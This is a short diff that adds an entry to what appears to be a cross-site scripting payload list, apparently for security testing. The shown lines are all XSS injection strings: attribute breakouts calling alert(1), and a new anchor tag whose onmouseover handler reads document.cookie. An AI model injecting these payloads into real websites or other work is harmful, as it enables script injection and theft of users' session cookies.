@@ -11,3 +11,5 @@
 "onmouseover="alert(1)
 
 '-alert(1)-'
+
+"><a onmouseover="alert(document.cookie)">xxs link</a>
